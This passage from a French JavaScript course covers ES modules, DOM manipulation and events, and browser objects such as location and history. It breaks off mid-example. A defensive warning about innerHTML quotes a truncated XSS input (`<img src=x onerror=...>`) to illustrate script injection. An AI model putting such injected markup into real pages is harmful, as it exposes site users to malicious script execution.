| Données privées légères, peu d'instances | Fabrique + fermeture |
| Assemblage de comportements indépendants | Composition / mixins |
| Configuration, enregistrement de données | Objet littéral |

### 19.11 Bonnes pratiques

- Une classe = **une responsabilité**, petite et cohérente.
- Préférez la **composition** à l'héritage profond (au-delà de 2-3 niveaux, la hiérarchie devient fragile).
- Utilisez les champs **`#privés`** pour protéger l'état et validez dans les setters.
- Appelez `super()` en premier dans un constructeur dérivé.
- Ne faites pas de travail lourd ou asynchrone dans un constructeur : utilisez une **fabrique statique asynchrone** (`static async creer()`).
- Définissez `toString()` / `toJSON()` quand l'objet doit être affiché ou sérialisé.
- Respectez le **principe de substitution de Liskov** : une sous-classe doit pouvoir remplacer sa classe mère sans surprise.

### Points clés du module 19

- Une classe est une syntaxe claire sur les prototypes : constructeur, méthodes partagées, champs, accesseurs, statiques.
- `extends` et `super` expriment l'héritage ; `super()` précède `this` dans un constructeur dérivé.
- `#privé` garantit l'encapsulation ; le polymorphisme s'appuie sur le *duck typing*.
- `using` automatise la libération des ressources (stade 4, ES2027).

## 20. Modules (`import` / `export`)

### 20.1 Pourquoi des modules ?

Un **module** est un fichier JavaScript doté de sa **propre portée** : ses variables ne sont pas globales, et il choisit ce qu'il **exporte**. Les modules ES (**ESM**, norme ES2015) apportent :

- l'**isolation** (aucune pollution de l'espace global, pas de collisions de noms) ;
- des **dépendances explicites** (chaque fichier déclare ce dont il a besoin) ;
- la **réutilisation** et la maintenabilité (découpage par responsabilité) ;
- l'**analyse statique** : les outils détectent le code inutilisé (*tree-shaking*) et optimisent le chargement.

Avant les modules, on utilisait des IIFE, des espaces de noms globaux et des formats comme CommonJS (Node) ou AMD.

### 20.2 Activer les modules

```html
<script type='module' src='main.js'></script>
```

- **Navigateur** : `<script type='module'>`. Les modules sont **différés** par défaut (comme `defer`), en **mode strict**, avec leur propre portée, et chargés via **HTTP(S)** avec les règles CORS : l'ouverture directe d'un fichier (`file://`) échoue généralement.
- **Node.js** : extension **`.mjs`**, ou `"type": "module"` dans `package.json` (alors `.cjs` désigne CommonJS).
- `this` au niveau supérieur d'un module vaut `undefined`.

### 20.3 `export`

```javascript
// maths.js
export const PI = 3.14159;                           // export nommé d'une déclaration
export function additionner(a, b) { return a + b; }
export class Calculatrice {
    multiplier(a, b) { return a * b; }
}

// Export par défaut : un seul par module
export default function soustraire(a, b) { return a - b; }

// Regroupement et renommage
export { additionner as somme, PI as PI_COURT };

// Réexportation (fichier « barrel »)
export * from './autres.js';                         // autres.js : export const E = 2.718;
export { E as EULER } from './autres.js';
export * as constantes from './autres.js';           // sous forme d'espace de noms
```

| Type d'export | Syntaxe | Importé avec |
| --- | --- | --- |
| **Nommé** | `export const x`, `export { x }` | `import { x } from ...` (nom imposé, alias possible) |
| **Par défaut** | `export default valeur` | `import nimporteQuoi from ...` |
| **Réexport** | `export { x } from './f.js'`, `export * from` | — |

Préférez les **exports nommés** : ils sont détectés par les éditeurs, renommés de façon cohérente et se prêtent mieux au *tree-shaking*.

### 20.4 `import`

```javascript
// main.js (à côté de maths.js et autres.js)
import soustraire from './maths.js';                   // import par défaut
import { PI, additionner } from './maths.js';          // imports nommés
import { additionner as plus } from './maths.js';      // alias
import * as maths from './maths.js';                   // tout, dans un espace de noms (objet figé)
import './effets-de-bord.js';                          // exécute le module sans rien importer

console.log(soustraire(5, 3));             // 2
console.log(PI, additionner(2, 3));        // 3.14159 5
console.log(plus(1, 1));                   // 2
console.log(maths.E, maths.somme(4, 4));   // 2.718 8
```

Le **chemin relatif** doit commencer par `./` ou `../` et inclure l'**extension** `.js` dans le navigateur et dans Node.js natif. Un nom nu (`import _ from 'lodash'`) désigne un **paquet** résolu par Node.js, un bundler, ou une *import map* dans le navigateur :

```html
<script type='importmap'>
  { "imports": { "lodash": "https://cdn.jsdelivr.net/npm/lodash-es@4/lodash.js" } }
</script>
```

Les déclarations `import` sont **hoistées** : elles s'exécutent avant le reste du module, quel que soit leur emplacement ; elles doivent figurer au **niveau supérieur**.

#### Import dynamique (chargement à la demande)

`import(chemin)` est une **expression** qui renvoie une **promesse** du module ; elle peut apparaître n'importe où et accepter un chemin calculé. Elle permet le **découpage de code** (*code splitting*) : charger un module seulement quand on en a besoin.

```javascript
// graphique.js : export function dessiner() { console.log('Graphique dessiné'); }
document.body.innerHTML = `<button id='graphique'>Afficher le graphique</button>`;

const bouton = document.querySelector('#graphique');
bouton.addEventListener('click', async () => {
    const { dessiner } = await import('./graphique.js');    // chargé seulement au clic
    dessiner();
});
bouton.click();
```

#### Import de JSON et attributs d'import

```javascript
// donnees.json (même dossier) : { "total": 3 }
import donnees from './donnees.json' with { type: 'json' };
console.log(donnees.total);   // 3
```

L'attribut `with { type: 'json' }` est **obligatoire** : il garantit que le fichier est bien traité comme des données et non comme du code. D'autres types (`css`) existent selon les environnements.

### 20.5 Fonctionnement interne

- **Liaisons vivantes** (*live bindings*) : un import est une **référence** à la variable exportée, pas une copie. Si le module exportateur la modifie, les importateurs voient le changement ; on ne peut pas réaffecter un import depuis l'importateur (`TypeError`).
- **Évaluation unique** : un module n'est évalué qu'**une fois**, puis mis en cache ; tous les importateurs partagent la même instance (utile pour un singleton, source d'état partagé involontaire).
- **Phases** : chargement (téléchargement et analyse du graphe des dépendances), liaison (création des liaisons), évaluation (exécution dans l'ordre des dépendances).
- **Dépendances circulaires** : possibles, car les liaisons sont vivantes, mais fragiles (accès à une liaison pas encore initialisée : `ReferenceError`). Réorganisez le code pour les éviter.
- **`await` au niveau supérieur** (*top-level await*) est autorisé dans les modules ; il retarde l'évaluation des modules qui en dépendent.
- **`import.meta`** : métadonnées du module : `import.meta.url` (URL du module), et dans Node.js `import.meta.dirname` / `import.meta.filename`.

```javascript
// compteur.js
export let n = 0;
export function incrementer() { n++; }
// main.js
import { n, incrementer } from './compteur.js';
console.log(n);       // 0
incrementer();
console.log(n);       // 1 : liaison vivante ; (n = 5 ici lèverait une TypeError)
```

### 20.6 Modules ES et CommonJS

|  | ESM | CommonJS (Node historique) |
| --- | --- | --- |
| Syntaxe | `import` / `export` | `require()` / `module.exports` |
| Chargement | **Statique** (analysable), asynchrone | Dynamique, **synchrone** |
| Liaisons | Vivantes | Copies de valeurs |
| Mode strict | Automatique | Non |
| `this` global | `undefined` | `module.exports` |
| `__dirname`, `__filename` | Non (voir `import.meta`) | Oui |
| Standard | Oui (navigateurs et serveurs) | Spécifique à Node |

Node.js permet d'`import` du CommonJS et, dans les versions récentes, de `require()` des modules ES synchrones (sans `await` de haut niveau), ce qui facilite la cohabitation.

### 20.7 Organisation d'un projet

```text
projet/
├── index.html
├── package.json
└── src/
    ├── main.js            ← point d'entrée
    ├── utils/
    │   └── format.js      ← fonctions utilitaires
    └── composants/
        └── bouton.js      ← un module par responsabilité
```

Conseils : un module = une responsabilité ; limitez la surface exportée ; évitez les fichiers « fourre-tout » ; utilisez des fichiers `index.js` (*barrels*) avec parcimonie car ils peuvent alourdir le chargement ; pour la production, regroupez et optimisez avec un **bundler** (Vite, esbuild, Rollup, webpack).

### 20.8 Pièges courants

| Problème | Solution |
| --- | --- |
| *Failed to load module script* (`file://`, CORS, mauvais type MIME) | Servir via un serveur local (`npx vite`, `python -m http.server`) |
| Extension `.js` oubliée dans le chemin | L'ajouter à l'import |
| *Cannot use import statement outside a module* | `type='module'` (HTML) ou `.mjs` / `"type": "module"` (Node) |
| Mélange `export default` et nommés incohérent | Choisir une convention d'équipe (nommés de préférence) |
| Dépendances circulaires | Extraire le code commun dans un troisième module |
| `__dirname` / `require` indéfinis en ESM | `import.meta.dirname`, `import` |
| Modification d'un import | Les imports sont en lecture seule : exportez une fonction de modification |

### Points clés du module 20

- Un module a sa propre portée, est strict, et se charge avec `type='module'` ou `.mjs`.
- `export` (nommé / par défaut) et `import` (statique, dynamique) organisent les dépendances.
- Les imports sont des **liaisons vivantes** en lecture seule ; un module n'est évalué qu'une fois.
- Préférez les exports nommés, évitez les cycles, servez les modules via HTTP.

## 21. DOM et événements

### 21.1 Qu'est-ce que le DOM ?

Le **DOM** (*Document Object Model*) est la représentation de la page HTML sous forme d'un **arbre d'objets** que JavaScript peut **lire et modifier**. Quand le navigateur charge un document, il analyse le HTML, construit cet arbre, puis le combine avec les styles (CSSOM) pour afficher la page. Le point d'entrée est l'objet global **`document`**. Le DOM n'est **pas** une partie du langage JavaScript : c'est une API fournie par le navigateur (normalisée par le WHATWG).

```text
document
 └── html
      ├── head
      │    └── title
      └── body
           ├── h1
           └── div#app
                └── p.texte
```

Types de **nœuds** : **élément** (`<div>`), **texte**, **commentaire**, **document**, **fragment de document**, attribut. Le vocabulaire de l'arbre : **parent**, **enfant**, **frère** (*sibling*), **ancêtre**, **descendant**.

### 21.2 Sélectionner des éléments

```javascript
document.body.innerHTML = `
    <div class='conteneur'>
        <p id='titre' class='carte actif'>Premier</p>
        <p class='carte'>Second</p>
    </div>`;

const element = document.querySelector('#titre');

console.log(document.querySelector('#titre'));               // premier élément correspondant (sélecteur CSS), ou null
console.log(document.querySelectorAll('.carte').length);     // 2 : NodeList statique et itérable
console.log(document.getElementById('titre') === element);   // true : accès par id
console.log(element.closest('.conteneur'));                  // ancêtre le plus proche correspondant (lui-même inclus)
console.log(element.matches('.actif'));                      // true : l'élément correspond-il au sélecteur ?
console.log(element.parentElement.children.length, element.nextElementSibling.textContent);   // 2 'Second'
```

| Méthode | Renvoie | Remarque |
| --- | --- | --- |
| `querySelector(sel)` | Un élément ou `null` | Sélecteurs CSS complets ; appelable sur n'importe quel élément (recherche dans ses descendants) |
| `querySelectorAll(sel)` | `NodeList` **statique** | Itérable par `for...of` et `forEach` |
| `getElementById(id)` | Un élément ou `null` | Très rapide |
| `getElementsByClassName` / `getElementsByTagName` | `HTMLCollection` **vivante** | Se met à jour toute seule ; pas de `forEach` : convertir avec `Array.from` |
| `parentElement`, `children`, `firstElementChild`, `lastElementChild`, `previousElementSibling`, `nextElementSibling` | Navigation dans l'arbre | Variantes `*Node` incluent les nœuds de texte |

Testez toujours `null` avant d'utiliser un élément (`element?.classList.add(...)`).

### 21.3 Lire et modifier le contenu

```javascript
document.body.innerHTML = `
    <h1 id='titre'>Ancien titre</h1>
    <div id='conteneur'></div>
    <a id='lien' href='/ancien' disabled>Lien</a>
    <input id='champ' type='checkbox' checked>`;

const titre = document.querySelector('#titre');
const conteneur = document.querySelector('#conteneur');
const lien = document.querySelector('#lien');
const input = document.querySelector('#champ');

titre.textContent = 'Nouveau titre';                 // sûr : traite la valeur comme du TEXTE
console.log(titre.textContent);

conteneur.innerHTML = '<b>Gras</b>';                // interprète du HTML : risque XSS avec des données non fiables
console.log(conteneur.children.length);             // 1 : un élément <b> a été créé
conteneur.textContent = '<b>Gras</b>';              // affiché tel quel, sans créer d'élément
console.log(conteneur.children.length);             // 0

lien.setAttribute('href', '/accueil');              // attributs HTML
console.log(lien.getAttribute('href'), lien.hasAttribute('disabled'));
lien.removeAttribute('disabled');
lien.dataset.userId = '42';                         // attribut data-user-id (conversion camelCase ↔ kebab-case)
console.log(lien.outerHTML);                        // <a id='lien' href='/accueil' data-user-id='42'>Lien</a>
console.log(input.checked);                         // true : propriétés des champs (value, checked, disabled)
```

**Attribut ou propriété ?** Un **attribut** est ce qui est écrit dans le HTML (toujours une chaîne) ; une **propriété** est l'état courant de l'objet DOM (typé). `input.value` reflète ce que l'utilisateur a saisi ; l'attribut `value` conserve la valeur initiale. Pour les champs de formulaire, utilisez les **propriétés**.

| Propriété | Effet | Sûreté |
| --- | --- | --- |
| `textContent` | Lit/écrit le texte (tout le sous-arbre) | Sûre |
| `innerText` | Texte tel qu'affiché (tient compte du CSS) | Sûre, plus coûteuse |
| `innerHTML` | Lit/écrit le HTML interne | **Dangereuse** avec des données externes |
| `outerHTML` | HTML de l'élément lui-même | Idem |

> **N'insérez jamais une saisie utilisateur ou une donnée d'API avec `innerHTML`.** Un texte comme `<img src=x onerror=...>` exécuterait du code (**XSS**). Utilisez `textContent`, ou construisez les nœuds avec `createElement`, ou **assainissez** le HTML (API *Sanitizer*, bibliothèque DOMPurify).

### 21.4 Créer, insérer, déplacer et supprimer

```javascript
document.body.innerHTML = `
    <ul id='liste'><li id='reference'>Référence</li></ul>
    <template id='modele'><li>Depuis le modèle</li></template>`;

const liste = document.querySelector('#liste');
const reference = document.querySelector('#reference');
const modele = document.querySelector('#modele');
const creerLi = (texte) => Object.assign(document.createElement('li'), { textContent: texte });

const li = creerLi('Nouvel élément');
li.classList.add('item');

liste.append(li, 'texte');                      // à la fin ; accepte plusieurs nœuds et des chaînes
liste.prepend(creerLi('Premier'));              // au début
reference.before(creerLi('Avant la référence'));
reference.after(creerLi('Après la référence'));
reference.replaceWith(creerLi('Remplaçant'));
li.remove();                                    // supprime l'élément du DOM
liste.insertAdjacentHTML('beforeend', '<li>Rapide</li>');   // beforebegin | afterbegin | beforeend | afterend

liste.append(modele.content.cloneNode(true));   // <template> : fragment inerte à cloner (true = copie profonde)

const fragment = document.createDocumentFragment();   // regrouper avant d'insérer : une seule mise à jour
for (let i = 1; i <= 3; i++) fragment.append(creerLi(`Lot ${i}`));
liste.append(fragment);

console.log([...liste.children].map(e => e.textContent));
```

Insérer un nœud **déjà présent** dans le DOM le **déplace** (il n'existe jamais à deux endroits). `cloneNode(true)` en fait une copie profonde (sans les écouteurs). `replaceChildren(...nouveaux)` vide puis remplit un parent en une opération.

### 21.5 Classes et styles

```javascript
document.body.innerHTML = `<div id='boite' class='a cache'>Boîte</div>`;
const element = document.querySelector('#boite');

element.classList.add('actif');
element.classList.remove('cache');
element.classList.toggle('ouvert');                   // ajoute si absente, retire si présente
element.classList.toggle('mode', true);               // forcer l'état avec un second argument
console.log(element.classList.contains('actif'));     // true
element.classList.replace('a', 'b');
console.log(element.className);                       // 'b actif ouvert mode'

element.style.color = 'red';                          // style en ligne (propriétés en camelCase : backgroundColor)
element.style.setProperty('--couleur', 'tomato');     // variable CSS personnalisée
console.log(getComputedStyle(element).color);         // 'rgb(255, 0, 0)' : valeurs calculées (lecture seule)
```

> **Bonne pratique** : définissez l'apparence dans le CSS et **basculez des classes** plutôt que de manipuler `style` directement. Cela sépare les responsabilités et facilite les transitions.

### 21.6 Dimensions, positionnement et défilement

```javascript
document.body.innerHTML = `<div id='boite' style='width: 200px; height: 100px; overflow: auto;'>Boîte</div>`;
const element = document.querySelector('#boite');

console.log(element.getBoundingClientRect());     // { x, y, width, height, top, left, right, bottom } relatif à la fenêtre
console.log(element.offsetWidth, element.clientHeight);   // taille avec bordures / sans bordures ni barres
console.log(element.scrollHeight, element.scrollTop);     // hauteur totale du contenu / position de défilement
element.scrollIntoView({ behavior: 'smooth' });
window.scrollTo({ top: 0, behavior: 'smooth' });
```

Lire ces valeurs force le navigateur à **recalculer la mise en page** (*reflow*) : évitez d'alterner lectures et écritures dans une boucle (*layout thrashing*) ; regroupez d'abord toutes les lectures, puis toutes les écritures.

### 21.7 Les événements

Un **événement** est un signal émis par le navigateur (clic, frappe, chargement, fin d'animation…) ou par votre code. On y réagit en enregistrant un **écouteur** (*listener*, ou gestionnaire) avec `addEventListener`. L'écouteur reçoit un **objet événement** décrivant ce qui s'est passé.

```javascript
document.body.innerHTML = `<button id='bouton'>Cliquer</button>`;
const bouton = document.querySelector('#bouton');

bouton.addEventListener('click', (evenement) => {
    console.log(evenement.type);            // 'click'
    console.log(evenement.target);          // élément réellement visé (le plus profond)
    console.log(evenement.currentTarget);   // élément qui porte l'écouteur
    evenement.preventDefault();             // annule l'action par défaut (envoi de formulaire, suivi de lien…)
    evenement.stopPropagation();            // empêche la propagation vers les ancêtres
});
bouton.click();                             // simule un clic

function gestionnaire() { console.log('Clic géré'); }
bouton.addEventListener('click', gestionnaire);
bouton.removeEventListener('click', gestionnaire);     // il faut la MÊME référence de fonction
bouton.click();                                        // 'Clic géré' n'est pas affiché
```

Préférez `addEventListener` aux attributs HTML `onclick='...'` (mélange du code et du balisage, un seul gestionnaire possible, incompatible avec une CSP stricte).

#### Options de `addEventListener`

```javascript
document.body.innerHTML = `<button id='bouton'>Cliquer</button>`;
const bouton = document.querySelector('#bouton');
const controleur = new AbortController();

bouton.addEventListener('click', () => console.log('Clic reçu'), {
    once: true,                       // se désinscrit après le premier appel
    passive: true,                    // promet de ne pas appeler preventDefault (défilement fluide)
    signal: controleur.signal,        // désinscription groupée via AbortController
    // capture: true,                 // écoute pendant la phase de capture
});

bouton.click();                       // 'Clic reçu'
bouton.click();                       // rien : écouteur « once »
controleur.abort();                   // retire en une fois tous les écouteurs liés à ce signal
```

#### Événements courants

| Catégorie | Événements |
| --- | --- |
| **Souris / pointeur** | `click`, `dblclick`, `contextmenu`, `pointerdown`, `pointermove`, `pointerup`, `pointerenter`, `pointerleave`, `wheel` |
| **Clavier** | `keydown`, `keyup` (`event.key` : caractère ; `event.code` : touche physique ; `event.repeat`) |
| **Formulaire** | `input` (à chaque modification), `change` (validation de la valeur), `submit`, `reset`, `focus`, `blur`, `invalid` |
| **Fenêtre / document** | `DOMContentLoaded`, `load`, `resize`, `scroll`, `beforeunload`, `visibilitychange`, `popstate`, `hashchange` |
| **Tactile** | `touchstart`, `touchmove`, `touchend` (préférez les événements *pointer*) |
| **Glisser-déposer** | `dragstart`, `dragover`, `drop` |
| **Média / réseau** | `play`, `pause`, `ended`, `online`, `offline` |
| **Animation** | `transitionend`, `animationend` |

> **Bonne pratique** : les événements **Pointer** (`pointerdown`…) unifient souris, doigt et stylet : ils remplacent avantageusement `mouse*` et `touch*`.

#### Propagation : capture, cible, bulle

Un événement traverse l'arbre en **trois phases** : **capture** (de `window` vers la cible), **cible**, puis **bulle** (*bubbling*, retour de la cible vers `window`). Par défaut, un écouteur réagit pendant la **bulle** ; `{ capture: true }` le place dans la capture. Certains événements ne remontent pas (`focus`, `blur`, `mouseenter`) ; leurs équivalents `focusin`, `focusout` et `mouseover` le font.

```javascript
document.body.innerHTML = `<div id='parent'><button id='enfant'>Clic</button></div>`;
const parent = document.querySelector('#parent');
const enfant = document.querySelector('#enfant');

parent.addEventListener('click', () => console.log('parent (capture)'), { capture: true });
parent.addEventListener('click', () => console.log('parent (bulle)'));
enfant.addEventListener('click', () => console.log('enfant (cible)'));
enfant.click();   // parent (capture), enfant (cible), parent (bulle)
```

`stopPropagation()` empêche d'atteindre les autres éléments ; `stopImmediatePropagation()` bloque aussi les écouteurs restants du même élément. Utilisez-les avec parcimonie : ils cassent les mécanismes globaux (analytique, délégation).

#### Délégation d'événements

Au lieu d'ajouter un écouteur à **chaque** enfant, on place **un seul** écouteur sur un ancêtre commun et l'on identifie l'origine avec `event.target`. Avantages : moins de mémoire, et les éléments **ajoutés plus tard** sont couverts automatiquement.

```javascript
document.body.innerHTML = `<ul id='liste'><li>Pomme</li><li>Poire</li></ul>`;
const liste = document.querySelector('#liste');

liste.addEventListener('click', (e) => {
    const item = e.target.closest('li');          // closest gère les clics sur des enfants de <li>
    if (!item || !liste.contains(item)) return;   // clic hors d'un <li> de cette liste
    console.log('Clic sur', item.textContent);
});

liste.append(Object.assign(document.createElement('li'), { textContent: 'Cerise' }));   // couvert sans nouvel écouteur
liste.querySelector('li:last-child').click();     // 'Clic sur Cerise'
```

#### Événements personnalisés

```javascript
document.body.innerHTML = `<div id='panier'></div>`;
const element = document.querySelector('#panier');

element.addEventListener('commande:ajoutee', e => console.log(e.detail.id));    // 7
element.dispatchEvent(new CustomEvent('commande:ajoutee', { detail: { id: 7 }, bubbles: true }));
```

#### Formulaires

```javascript
document.body.innerHTML = `
    <form id='formulaire'>
        <input name='nom' value='Alice' required>
        <input name='age' value='30'>
    </form>`;
const formulaire = document.querySelector('#formulaire');

formulaire.addEventListener('submit', (e) => {
    e.preventDefault();                        // empêche le rechargement de la page
    const donnees = new FormData(formulaire);
    const objet = Object.fromEntries(donnees);
    console.log(objet);                        // { nom: 'Alice', age: '30' } : toutes les valeurs sont des chaînes
});
formulaire.requestSubmit();                    // déclenche la validation puis l'événement submit
```

Utilisez la **validation native** (`required`, `pattern`, `min`, `type='email'`, `form.checkValidity()`, `input.setCustomValidity(msg)`) avant d'écrire votre propre logique. Validez **toujours aussi côté serveur**.

### 21.8 Quand le DOM est-il prêt ?

Un script ne peut manipuler que les éléments **déjà analysés**. Les événements clés : `DOMContentLoaded` (HTML analysé, DOM construit) et `load` (ressources comme images et feuilles de style chargées).

```javascript
function demarrer() {
    console.log('DOM construit', document.readyState);
}

if (document.readyState === 'loading') {
    document.addEventListener('DOMContentLoaded', demarrer);   // DOM pas encore construit : on attend
} else {
    demarrer();                                                // DOM déjà prêt : on exécute tout de suite
}
// Plus simple : <script defer> ou <script type='module'> (déjà différés : le DOM est prêt à l'exécution)
```

### 21.9 Observateurs modernes

Les **observateurs** remplacent des boucles de surveillance coûteuses (`scroll`, `setInterval`) par des notifications asynchrones et performantes.

| API | Rôle |
| --- | --- |
| `IntersectionObserver` | Détecter l'entrée / la sortie d'un élément dans la zone visible (chargement différé d'images, défilement infini, animations à l'apparition) |
| `ResizeObserver` | Réagir aux changements de taille d'un élément |
| `MutationObserver` | Réagir aux modifications du DOM (ajouts, attributs, texte) |
| `PerformanceObserver` | Collecter des mesures de performance |

```javascript
document.body.innerHTML = `<p class='apparition'>Je deviens visible</p>`;

const obs = new IntersectionObserver((entrees, observateur) => {
    entrees.forEach(e => {
        if (e.isIntersecting) {
            e.target.classList.add('visible');
            console.log('Visible :', e.target.textContent);
            observateur.unobserve(e.target);          // une seule fois
        }
    });
}, { threshold: 0.2 });                           // 20 % de l'élément visible
document.querySelectorAll('.apparition').forEach(el => obs.observe(el));
```

### 21.10 Shadow DOM et composants web

Les **composants web** (*Web Components*) sont une norme du navigateur pour créer des éléments réutilisables et encapsulés, sans framework. Ils reposent sur trois technologies :

- les **éléments personnalisés** (*Custom Elements*) : de nouvelles balises avec un nom contenant un tiret (`carte-utilisateur`) associées à une classe ;
- le **Shadow DOM** : un sous-arbre DOM **isolé** (structure et styles ne fuient pas, et le CSS de la page n'y entre pas) ;
- les éléments **`<template>`** et **`<slot>`** : modèles inertes et points d'insertion de contenu.

```javascript
class CarteUtilisateur extends HTMLElement {
    static observedAttributes = ['nom'];            // attributs à surveiller
    connectedCallback() {                           // appelé à l'insertion dans le document
        this.racine ??= this.attachShadow({ mode: 'open' });
        this.afficher();
    }
    attributeChangedCallback() { if (this.racine) this.afficher(); }
    afficher() {
        this.racine.innerHTML = `
            <style>p { color: steelblue; }</style>
            <p>Bonjour, <slot>${this.getAttribute('nom') ?? 'inconnu'}</slot></p>`;
    }
}
customElements.define('carte-utilisateur', CarteUtilisateur);

document.body.innerHTML = `<carte-utilisateur nom='Alice'></carte-utilisateur>`;
console.log(document.querySelector('carte-utilisateur').shadowRoot.querySelector('p').textContent);   // 'Bonjour, Alice'
```

Cycle de vie : `constructor`, `connectedCallback`, `disconnectedCallback`, `attributeChangedCallback`, `adoptedCallback`. Bibliothèques facilitant leur écriture : **Lit**.

### 21.11 Animations

- **CSS** (transitions, `@keyframes`) : à privilégier pour les animations simples, exécutées par le compositeur (fluides). Animez de préférence `transform` et `opacity`.
- **`requestAnimationFrame(callback)`** : appelle votre fonction **avant le prochain rendu**, synchronisée avec le taux de rafraîchissement ; à utiliser pour toute animation pilotée par JavaScript.
- **Web Animations API** (`element.animate`) : animations déclaratives pilotables (pause, inversion, `finished`).

```javascript
document.body.innerHTML = `<div id='boite'>Animation</div>`;
const element = document.querySelector('#boite');

const animation = element.animate(
    [{ opacity: 0, transform: 'translateY(20px)' }, { opacity: 1, transform: 'none' }],
    { duration: 400, easing: 'ease-out', fill: 'forwards' },
);
animation.finished.then(() => console.log('Animation terminée'));

let x = 0;
function images() {                         // boucle d'animation pilotée par JS
    x += 2;
    element.style.transform = `translateX(${x}px)`;
    if (x < 100) requestAnimationFrame(images);
}
requestAnimationFrame(images);
```

Respectez la préférence **« réduire les animations »** : `window.matchMedia('(prefers-reduced-motion: reduce)').matches`.

### 21.12 Référence : interfaces principales

| Interface | Rôle |
| --- | --- |
| `EventTarget` | `addEventListener`, `removeEventListener`, `dispatchEvent` (base de presque tout) |
| `Node` | Base des nœuds : `parentNode`, `childNodes`, `textContent`, `cloneNode()`, `contains()` |
| `Element` | Éléments : `classList`, `attributes`, `querySelector`, `closest`, `getBoundingClientRect` |
| `HTMLElement` | Éléments HTML : `style`, `dataset`, `hidden`, `focus()`, `click()` |
| `Document` | La page : `body`, `head`, `title`, `createElement`, `cookie`, `readyState` |
| `DocumentFragment` | Conteneur léger hors du DOM |
| `NodeList` / `HTMLCollection` | Collections de nœuds |
| `Event` / `MouseEvent` / `KeyboardEvent` / `PointerEvent` / `CustomEvent` | Types d'événements |
| `CSSStyleDeclaration` | `element.style` |

### 21.13 Accessibilité

Une interface dynamique doit rester **utilisable au clavier et avec un lecteur d'écran** :

- utilisez les éléments **sémantiques** (`<button>`, `<a>`, `<dialog>`, `<nav>`) plutôt que des `<div>` cliquables ;
- gérez le **focus** (`element.focus()`, ordre de tabulation logique, piège de focus dans les fenêtres modales) ;
- ajoutez des attributs **ARIA** (`aria-label`, `aria-expanded`, `aria-live`) quand le HTML seul ne suffit pas ;
- prévoyez les interactions clavier (`Entrée`, `Espace`, `Échap`, flèches) en plus de la souris ;
- annoncez les changements dynamiques par une zone `aria-live`.

### 21.14 Bonnes pratiques

- Minimisez les accès au DOM et **regroupez les modifications** (fragment, classes CSS, `replaceChildren`).
- Utilisez la **délégation** pour les listes dynamiques.
- Préférez `textContent` à `innerHTML` ; **assainissez** tout HTML externe.
- Retirez les écouteurs devenus inutiles (ou utilisez `signal`) pour éviter les fuites de mémoire.
- Séparez structure (HTML), apparence (CSS) et comportement (JS).
- Pour de grosses interfaces, utilisez un framework (React, Vue, Svelte…) ou des composants web.

### Points clés du module 21

- Le DOM est un arbre d'objets accessible via `document` ; `querySelector(All)` sélectionne, `textContent` et `classList` modifient en sécurité.
- Les événements se propagent en capture puis en bulle ; `preventDefault` annule l'action par défaut ; la délégation optimise les listes.
- `innerHTML` avec des données externes est une faille XSS.
- Observateurs, composants web et Web Animations remplacent bon nombre de bricolages anciens.

## 22. Environnement du navigateur (BOM) et stockage

### 22.1 Le BOM

Le **BOM** (*Browser Object Model*) regroupe les objets qui permettent d'interagir avec le **navigateur** lui-même (fenêtre, URL, historique, écran), par opposition au **DOM**, qui représente le contenu de la page. Il n'a pas de spécification unique et unifiée, mais ses éléments sont aujourd'hui largement uniformes (standardisés dans la spécification HTML).

| Objet | Rôle |
| --- | --- |
| `window` | Objet global du navigateur : fenêtre, dimensions, minuteries, ouverture d'onglets |
| `navigator` | Informations sur le navigateur et l'appareil : langue, connexion, géolocalisation, presse-papiers |
| `location` | URL courante et navigation |
| `history` | Historique de navigation de l'onglet |
| `screen` | Informations sur l'écran |
| `localStorage` / `sessionStorage` | Stockage clé-valeur |

#### `window`

```javascript
console.log(window.innerWidth, window.innerHeight);     // taille de la zone d'affichage
console.log(window.devicePixelRatio);                   // densité de pixels
console.log(window.matchMedia('(prefers-color-scheme: dark)').matches);   // thème sombre actif ?
const media = window.matchMedia('(max-width: 600px)');
media.addEventListener('change', (e) => console.log('Petit écran :', e.matches));   // réagir aux media queries
// window.open('https://example.com', '_blank', 'noopener');   // ouvre un onglet (souvent bloqué hors d'un geste utilisateur)
```

**Toujours `noopener`** quand vous ouvrez un lien externe : sans lui, la page ouverte peut manipuler la vôtre via `window.opener`.

#### `navigator`

```javascript
console.log(navigator.language, navigator.languages);   // 'fr-FR' ['fr-FR', 'fr', ...]
console.log(navigator.onLine);                          // true : indication approximative de la connexion

navigator.clipboard.writeText('copié !')                // exige une page active et, selon le navigateur, une autorisation
    .then(() => console.log('Texte copié'))
    .catch((e) => console.error('Copie impossible :', e.message));

navigator.geolocation.getCurrentPosition(               // demande l'autorisation de l'utilisateur
    (pos) => console.log(pos.coords.latitude, pos.coords.longitude),
    (err) => console.error('Position refusée ou indisponible :', err.message),
);
```

Les API sensibles (géolocalisation, caméra, micro, notifications, presse-papiers) nécessitent le **consentement explicite** de l'utilisateur, un **contexte sécurisé** (HTTPS) et sont déclenchées par une action utilisateur. N'utilisez **jamais** `navigator.userAgent` pour détecter des fonctionnalités : testez la fonctionnalité elle-même.

#### `location`

```javascript
console.log(location.href, location.origin, location.hostname, location.pathname, location.search, location.hash);
location.hash = '#section-2';                    // change le fragment sans recharger la page
console.log(location.hash);                      // '#section-2'

const params = new URLSearchParams(location.search);   // lire les paramètres de requête
console.log(params.get('page'));

// Ces appels quittent la page : ils sont rangés dans un objet et appelés seulement à la demande
const navigation = {
    avecHistorique: () => location.assign('/page'),     // navigue en conservant l'historique
    sansHistorique: () => location.replace('/page'),    // navigue sans entrée d'historique (pas de retour possible)
    recharger: () => location.reload(),
};
```

#### `history` et applications monopages (SPA)

```javascript
window.addEventListener('popstate', e => console.log('popstate :', e.state));
history.pushState({ page: 2 }, '', '?page=2');   // ajoute une entrée et change l'URL SANS recharger (SPA)
console.log(location.search);                    // '?page=2'
history.replaceState({ page: 2, vu: true }, ''); // modifie l'entrée courante
history.back();                                  // déclenche popstate (état null : entrée initiale)
// history.forward();  history.go(-2);
```

Les routeurs des applications monopages (React Router, Vue Router…) reposent sur `pushState` et `popstate`. L'**API Navigation** (`navigation.navigate`) offre une alternative moderne dans les navigateurs qui la prennent en charge.

#### `screen`

```javascript
console.log(screen.width, screen.height, screen.colorDepth, screen.orientation?.type);
```

#### Boîtes de dialogue

`alert()`, `confirm()` et `prompt()` **bloquent** la page, ne se stylent pas et sont peu accessibles. Préférez l'élément HTML **`<dialog>`** :

```javascript
document.body.innerHTML = `
    <dialog>
        <p>Bonjour depuis la boîte de dialogue</p>
        <form method='dialog'><button>Fermer</button></form>
